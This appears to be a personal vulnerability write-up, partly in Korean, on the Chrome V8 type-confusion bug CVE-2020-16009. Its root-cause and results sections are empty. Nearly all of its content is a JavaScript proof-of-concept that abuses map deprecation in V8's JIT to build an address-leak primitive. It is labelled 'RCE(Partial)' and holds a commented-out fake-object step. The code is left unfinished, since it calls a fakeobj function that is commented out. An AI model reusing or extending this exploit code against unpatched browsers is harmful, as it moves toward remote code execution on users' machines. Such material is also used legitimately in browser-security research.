# Chrome V8 Type Confusion RCE(Partial) (CVE-2020-16009)
* Date : Oct 2020
* Credit : [saelo@google.com](https://bugs.chromium.org/p/project-zero/issues/detail?id=2106)
* CVSS : [8.8](https://nvd.nist.gov/vuln/detail/CVE-2020-16009)
* Affected Versions : Chrome < 86.0.4240.183
* Patch : [v8 취약점 패치 commit](https://chromium.googlesource.com/v8/v8.git/+/3ba21a17ce2f26b015cc29adc473812247472776)

## Root Cause Analysis
### Map::CanBeDeprecated


## PoC Code
still addrof only..

```javascript
let convert = new ArrayBuffer(0x8);
let f64 = new Float64Array(convert);
let u32 = new Uint32Array(convert);
let BASE = 0x100000000;
function i2f(x) {
      u32[0] = x % BASE;
      u32[1] = (x - (x % BASE)) / BASE;
      return f64[0];
}
function f2i(x) {
      f64[0] = x;
      return u32[0] + BASE * u32[1];
}
function i2jsv(x) {
    u32[0] = (x % BASE);
    u32[1] = ((x - (x % BASE)) / BASE) - 0x10000;
    return f64[0];
}
function hex(x) {
      return `0x${x.toString(16)}`
}

function assert(c) {
    if (!c) { throw "Assertion failed"; }
}

function assertFalse(c) {
    assert(!c);
}

 //function poc() {
function hax(o) {
    var t = {};
    t.x = 13.37;
    o.c = t.x;
}

function makeObjWithMap5() {
    let o = {};
    o.a = 13.37;
    o.b = {};
    return o
}

// Create a bunch of Maps. See the assertions for their relationships

let m1 = {};
let m2 = {};
//assert(%HaveSameMap(m2, m1));
m2.a = 13.37;

let m3 = {};
m3.a = 13.37;
//assert(%HaveSameMap(m3, m2));
m3.b = 1;

let m4 = {};
m4.a = 13.37;
m4.b = 1;
//assert(%HaveSameMap(m4, m3));
m4.c = {};

let m4_2 = {};
m4_2.a = 13.37;
m4_2.b = 1;
m4_2.c = {};
//assert(%HaveSameMap(m4_2, m4));

let m5 = {};
m5.a = 13.37;
//assert(%HaveSameMap(m5, m2));
m5.b = 13.37;
//assertFalse(%HaveSameMap(m5, m3));

// At this point, Map3 and Map4 are both deprecated. Map2 transitions to Map5.
// Map5 is the migration target for Map3. The Migration target for Map4 is a new Map
//assertFalse(%HaveSameMap(m5, m3));

let m6 = makeObjWithMap5();
//assert(%HaveSameMap(m6, m5));
hax(m6);

let kaputt = makeObjWithMap5();
//assert(%HaveSameMap(kaputt, m5));

for (let i = 0; i < 100000; i++) {
    let o = i == 1337 ? makeObjWithMap5() : m6;
    hax(o);
}

// Map4 is deprecated, so this property access triggers a Map migration.
// This will end up creating a new Map, Map7, to which both Map4 and Map6
// migrate. Map5's transition entry afterwards points to Map7 and no
// longer to Map6. Map6 is deprecated.
let m7 = m4_2;
//assert(%HaveSameMap(m7, m4));
m7.c;
//assertFalse(%HaveSameMap(m7, m4));

function addrof(o_){
    let k = makeObjWithMap5();
    k.a = o_;
    hax(k);
    x = f2i(k.a);
    return (x-x%BASE)/BASE;
}

//function fakeobj(addr){
//    let k = makeObjWithMap5();
//    var tmp = {};
//    tmp.n = 1.1;
//    tmp.m = 2.2;
//    k.a = tmp;
//    o_ = k.a;
//    //%DebugPrint(k);
//    //%DebugPrint(o_);
//    hax(k);
//    backup = f2i(k.a);
//    //%DebugPrint(k);
//    //k.a = i2f((addr * BASE) + (backup % BASE));
//    console.log(hex(f2i(k.a)));
//    //%DebugPrint(o_);
//    return o_;
//}
// However, hax was not deoptimized and still transitions to Map6 because
// Map::CanBeDeprecated returns false for it.

// This does a in-place map generalization of Map5 and Map7, but not Map6.
// Map6 still indicates that .a should be a double field.
tarray = [1.1, 2.2];
tarray2 = [i2f(0x0000dead08042ab1)];
taddr = addrof(tarray2);
var victim = fakeobj(taddr);
//kaputt.a = tarray;
//assert(%HaveSameMap(kaputt, m5));


// This now migrates to the wrong map (Map6) because hax was not deoptimized.
// This is incorrect because .a now stores a HeapObject and not a double.
//hax(kaputt);

// This now fails in debug builds
//%HeapObjectVerify(kaputt);

// This prints (presumably) an address in release builds
//%DebugPrint(tarray);
//%DebugPrint(tarray2);
//console.log(hex(f2i(kaputt.a)));
//console.log(hex(addrof(victim)));
console.log(hex(taddr));
```

## 실행 결과


## Reference
- [project-zero](https://bugs.chromium.org/p/project-zero/issues/detail?id=2106)
